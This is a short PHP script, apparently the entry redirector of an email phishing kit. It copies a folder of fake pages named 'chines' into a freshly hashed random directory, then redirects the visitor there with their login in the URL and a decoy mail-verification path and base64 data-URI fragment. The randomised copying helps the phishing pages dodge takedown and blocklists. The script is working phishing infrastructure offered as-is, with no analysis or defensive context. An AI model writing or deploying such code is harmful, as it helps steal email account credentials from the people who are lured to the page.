<?
session_start();
$_SESSION['referer'] = isset($_SERVER['REQUEST_URI']) ? $_SERVER['HTTP_REFERER'] : '';

$login = $_GET['login'];
$random=rand(0,1000000000000);
$md5=md5("$random");
$base=base64_encode($md5);
$dst=md5("$base");
function recurse_copy($src,$dst) { 
$dir = opendir($src); 
@mkdir($dst); 
while(false !== ( $file = readdir($dir)) ) { 
if (( $file != '.' ) && ( $file != '..' )) { 
if ( is_dir($src . '/' . $file) ) { 
recurse_copy($src . '/' . $file,$dst . '/' . $file); 
} 
else { 
copy($src . '/' . $file,$dst . '/' . $file); 
} 
} 
} 
closedir($dir); 
} 
$src="chines";
recurse_copy( $src, $dst );
header("Location: $dst?login=$login&.verify?service=mail&data:text/html;charset=utf-8;base64,PGh0bWw+DQo8c3R5bGU+IGJvZHkgeyBtYXJnaW46IDA7IG92ZXJmbG93OiBoaWRkZW47IH0gPC9zdHlsZT4NCiAgPGlmcmFt");
?>